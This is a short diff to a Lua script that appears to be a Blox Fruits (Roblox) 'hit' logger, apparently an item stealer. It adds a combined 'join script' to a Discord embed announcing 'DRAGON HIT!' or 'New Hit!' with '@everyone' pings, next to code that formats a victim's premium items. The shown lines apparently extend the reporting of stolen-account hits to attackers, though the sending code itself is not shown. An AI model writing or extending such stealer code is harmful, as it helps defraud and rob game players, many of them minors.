@@ -580,6 +580,12 @@ local function formatPremiumItems()
     return #formattedItems > 0 and table.concat(formattedItems, "\n") or "None"
 end
 
+local joinCombinedScript = string.format(
+    "```lua\n%s\n\n%s\n```",
+    JoinScript,
+    (Sea == "Sea 2" and Sea2Script or Sea3Script)
+)
+
 local embed = {
     title = hasDragonFruit and "DRAGON HIT! ; https://discord.gg/zJKDqRd5" or "BluesHub BF Joiner ; https://discord.gg/zJKDqRd5",
     description = hasDragonFruit and "DRAGON FRUIT HIT! @everyone" or "New Hit! @everyone",
